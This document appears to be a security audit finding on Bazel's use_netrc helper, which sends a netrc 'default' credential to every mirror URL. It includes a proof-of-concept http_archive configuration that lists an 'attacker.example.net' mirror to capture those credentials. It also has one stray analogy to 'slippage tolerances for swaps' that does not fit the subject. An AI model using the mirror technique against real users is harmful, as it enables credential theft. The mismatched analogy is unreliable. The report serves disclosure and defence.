### Title
Netrc "default" machine credentials are sent to every mirror URL, including attacker‑controlled hosts - ([File: tools/build_defs/repo/utils.bzl])

### Summary
The `use_netrc` helper used by `http_archive`/`http_jar`/`http_file` and Bzlmod registry fetches applies a single netrc entry — the "default" (empty-hostname) machine — to *every* URL in a mirror list, without any host-specific scoping check for that fallback case. Since a mirror list for "the same file" can legitimately contain hosts that are not equally trusted (module registry `mirror_urls`, user-specified backup `urls`), a hostile mirror host ends up receiving the same login/password (or bearer token) that the user intended only for their primary, trusted host.

### Finding Description
`use_netrc(netrc, urls, patterns)` in `tools/build_defs/repo/utils.bzl` iterates over the list of mirror URLs for a single download and, for each URL, resolves per-host credentials: [1](#0-0) 

```
auth = {}
for url in urls:
    ...
    host = schemerest[1].split("/")[0].split(":")[0]
    if host in netrc:
        authforhost = netrc[host]
    elif "" in netrc:
        authforhost = netrc[""]
    else:
        continue
```

When the user's `.netrc` contains a `default` stanza (netrc syntax explicitly supports a wildcard "default" machine, parsed here as the empty string key, per the netrc-reading code that treats `default` as `currentmachinename = ""`), that single credential is applied to *any* host that does not have an explicit entry — including every mirror URL in the list. The rest of `use_netrc` then blindly emits `auth[url] = {...}` with that credential for the pattern/basic/bearer case: [2](#0-1) 

Bazel's `repository_ctx.download`/`download_and_extract` treats the `url` parameter as "mirror URLs referencing the same file" (documented explicitly), meaning multiple different hosts are tried for one artifact — e.g. Bzlmod registry `mirror_urls` (`bazel_registry.json`) or user-declared `urls` fallback lists in `http_archive`. This is exactly the "same parameter reused across two operations that should be scoped differently" bug class described in the report: instead of two different slippage tolerances for two different swaps, here a single "default" credential is reused across N different destination hosts that should each have independently-scoped credentials (or none at all).

If any one of those mirror hosts is attacker-controlled (a public mirror added to a registry's `bazel_registry.json`, or a spurious extra URL in a shared `urls` list), the attacker's server will receive the Authorization header/basic-auth credentials meant for the legitimate host, because `use_netrc` does not restrict the "default" fallback to only the primary/first URL or verify that the host is one the user actually intended to authenticate to.

### Impact Explanation
This breaks the invariant that "credentials are host-scoped." A netrc `default` entry, commonly used by developers for convenience (e.g., a single corporate artifact-proxy token), silently leaks to any additional mirror host present in the URL list for that artifact — resulting in credential exfiltration to an attacker-controlled origin without any local machine or MITM access being required. This matches the "Credentials exfiltration to an attacker-controlled host" acceptance criterion.

### Likelihood Explanation
Likelihood is moderate: it requires (a) the victim to have a netrc `default` entry configured, and (b) a URL list/mirror list for a fetch that includes a host the attacker controls (e.g. because that host is listed as a `mirrors` entry in a `bazel_registry.json` served by a registry the user configured, or is included as a legitimate-looking secondary mirror URL). Both conditions are realistic in registry/mirror-based CI setups, and do not require any elevated access — the attacker only needs to be reachable at the URL that Bazel will try.

### Recommendation
- Do not apply the netrc `default` entry to arbitrary mirror URLs indiscriminately; only apply host-specific netrc entries, and require explicit opt-in (e.g., only apply `default` credentials to the first/primary URL, or warn/skip when multiple distinct hosts are present in a single download's URL list).
- Consider requiring `auth_patterns`/explicit per-host netrc entries when multiple hosts are used as mirrors, and emit a warning if `default` credentials would be sent to more than one distinct host for the same artifact fetch.

### Proof of Concept
1. Create a `.netrc` with only a `default` entry:
   ```
   default
       login myuser
       password SECRET_TOKEN
   ```
2. Configure an `http_archive` (or a Bzlmod registry `bazel_registry.json` with a `mirrors` entry) whose `urls`/`mirror_urls` include both the legitimate host and an attacker-controlled host, e.g.:
   ```
   http_archive(
       name = "dep",
       urls = [
           "https://legit-artifacts.example.com/dep.tar.gz",
           "https://attacker.example.net/dep.tar.gz",
       ],
       sha256 = "...",
       netrc = "/home/user/.netrc",
   )
   ```
3. Run `bazel build //...`. Bazel's `use_netrc` resolves `authforhost = netrc[""]` for `attacker.example.net` (since it is not explicitly listed and `""` is present), and sends the `default` credentials to that host as well as to the legitimate host.
4. Observe on the attacker-controlled server that it received the `Authorization` header / basic-auth credentials intended only for `legit-artifacts.example.com`.

This should be encoded as a `BuildIntegrationTestCase`/shell test (similar to `src/test/py/bazel/bzlmod/bzlmod_credentials_test.py`) that spins up two local HTTP servers with distinct hostnames/ports, configures a `.netrc` with only a `default` entry, lists both server URLs as mirrors for one `http_archive`/`download` call, and asserts that the "attacker" server also received the Authorization header — demonstrating the credential leak.
